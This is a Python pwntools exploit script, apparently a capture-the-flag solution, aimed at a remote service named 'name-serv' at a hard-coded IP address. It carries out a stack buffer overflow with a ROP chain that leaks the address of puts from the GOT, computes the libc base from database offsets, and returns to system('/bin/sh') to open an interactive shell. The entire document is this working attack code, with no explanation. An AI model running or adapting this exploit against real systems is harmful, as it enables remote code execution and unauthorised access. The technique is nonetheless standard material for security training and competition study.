# THIS CODE IS WHEN THERE IS NO LIBC GIVEN , SO WE LEAK ADDRESS AND THEN CHECK DATABASE FOR THE PERFECT LIBC

from pwn import *
context.bits = 64

#elf = ELF("./name-serv")
#p = elf.process()

p = remote("3.97.113.25", 9001)

overwrite = b"A"*40

pop_rdi = p64(0x00000000004006d3)
ret = p64(0x00000000004004c6)

printf_at_got = p64(0x00601028)
puts_at_plt = p64(0x004004e0)
puts_at_got = p64(0x00601018)

safe_point_main = p64(0x0000000000400607)

# GOT FROM LIBC DATABASE
puts_offset = 0x0875a0
system = 0x055410
bin_sh = 0x1b75aa

payload = overwrite + pop_rdi + puts_at_got + puts_at_plt + safe_point_main

p.recvuntil(b"name: ")
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info("leak = " + str(hex(leak)))

libc_base = leak - puts_offset
system = libc_base + system
bin_sh = libc_base + bin_sh

log.info("Base address of libc: " + str(hex(libc_base)))
log.info("Real address of system in libc: " + str(hex(system)))
log.info("Real address of sh in libc: " + str(hex(bin_sh)))

payload2 = overwrite + ret + pop_rdi + p64(bin_sh) + p64(system)
p.recvline("name: ")
p.sendline(payload2)
p.interactive()
